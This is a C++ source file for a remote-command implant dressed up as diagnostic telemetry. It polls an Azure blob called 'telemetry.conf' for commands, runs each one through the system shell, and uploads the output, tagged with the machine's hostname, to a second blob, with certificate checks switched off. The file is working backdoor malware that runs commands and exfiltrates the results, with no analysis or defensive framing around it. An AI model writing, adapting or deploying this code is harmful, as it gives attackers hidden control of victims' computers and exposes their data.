#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <thread>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <curl/curl.h>
#ifdef _WIN32
#include <Winsock2.h>
#pragma comment(lib, "Ws2_32.lib")
#else
#include <unistd.h>
#endif

std::string last_uuid = "";

struct UploadData {
    FILE* file;
};

size_t read_callback(void* ptr, size_t size, size_t nmemb, void* stream) {
    UploadData* upload = (UploadData*)stream;
    if (!upload->file) return 0;
    return fread(ptr, size, nmemb, upload->file);
}


size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string get_hostname() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        return hostname;
    }
    return "unknown_host";
}

std::string run_command_to_file(const std::string& cmd, const std::string& filepath) {
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "error: _popen failed";

    std::ofstream out(filepath, std::ios::binary);
    if (!out) {
        _pclose(pipe);
        return "error: failed to open file";
    }

    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        out.write(buffer, strlen(buffer));
    }
    out.close();
    _pclose(pipe);
    return "ok";
}

bool upload_file(const std::string& base_url, const std::string& blob_name, const std::string& filepath, std::string& upload_blob_sas) {

    CURL* curl = curl_easy_init();
    if (!curl) return false;

    std::ifstream in(filepath, std::ios::binary | std::ios::ate);
    if (!in) {
        std::cerr << "Failed to open file: " << filepath << "\n";
        curl_easy_cleanup(curl);
        return false;
    }
    curl_off_t file_size = in.tellg();
    in.close();
    if (file_size == 0) {
        std::cerr << "File is empty. Skipping upload.\n";
        curl_easy_cleanup(curl);
        return false;
    }

    std::string escaped_blob_name = curl_easy_escape(curl, blob_name.c_str(), 0);
    std::string full_url = base_url + "/" + escaped_blob_name + "?" + upload_blob_sas;

    // std::cout << "Uploading to: " << full_url << std::endl;

    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "x-ms-blob-type: BlockBlob");

    FILE* f = fopen(filepath.c_str(), "rb");
    if (!f) {
        std::cerr << "Failed to reopen file for reading.\n";
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return false;
    }

    UploadData upload_ctx = { f };

    curl_easy_setopt(curl, CURLOPT_URL, full_url.c_str());
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
    curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
    curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_size);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    // curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    CURLcode res = curl_easy_perform(curl);
    long response_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    std::cout << "Upload HTTP response: " << response_code << "\n";

    fclose(f);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return res == CURLE_OK && response_code >= 200 && response_code < 300;

}
void poll_and_run(const std::string& cmd_blob_url, const std::string& upload_container_url, std::string& upload_blob_sas) {
    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "CURL init failed.\n";
        return;
    }

    while (true) {
        std::string response;
        curl_easy_setopt(curl, CURLOPT_URL, cmd_blob_url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Failed to fetch command: " << curl_easy_strerror(res) << "\n";
        } else {
            std::istringstream ss(response);
            std::string line;
            while (std::getline(ss, line)) {
                size_t comma = line.find(',');
                if (comma == std::string::npos) continue;

                std::string uuid = line.substr(0, comma);
                std::string cmd = line.substr(comma + 1);

                if (uuid != last_uuid) {
                    last_uuid = uuid;
                    std::cout << "New command: " << cmd << "\n";

                    std::string temp_file;
                    char* local_appdata = getenv("LOCALAPPDATA");
                    if (local_appdata) {
                        temp_file = std::string(local_appdata) + "\\chunk.tmp";
                    } else {
                        std::cerr << "LOCALAPPDATA is null. Using fallback path.\n";
                        temp_file = "chunk.tmp";
                    }

                    std::string exec_status = run_command_to_file(cmd, temp_file);
                    if (exec_status == "ok") {
                        std::string blob_name = uuid + "." + get_hostname();
                        if (upload_file(upload_container_url, blob_name, temp_file, upload_blob_sas)) {
                            std::cout << "Uploaded output as blob: " << blob_name << "\n";
                        } else {
                            std::cerr << "Upload failed\n";
                        }
                    } else {
                        std::cerr << "Failed to run command or write file: " << exec_status << "\n";
                    }
                    std::remove(temp_file.c_str());
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    curl_easy_cleanup(curl);
}


int main() {
    curl_global_init(CURL_GLOBAL_ALL);
	std::string cmd_blob_url = "https://diagnosticstelemetry.blob.core.windows.net/configuration/telemetry.conf?<Read-SAS-Token>";
	std::string upload_blob_url = "https://diagnosticstelemetry.blob.core.windows.net/stream";
	std::string upload_blob_sas = "<Write/Add-SAS-Token>";
	poll_and_run(cmd_blob_url, upload_blob_url,upload_blob_sas);
    return 0;
}



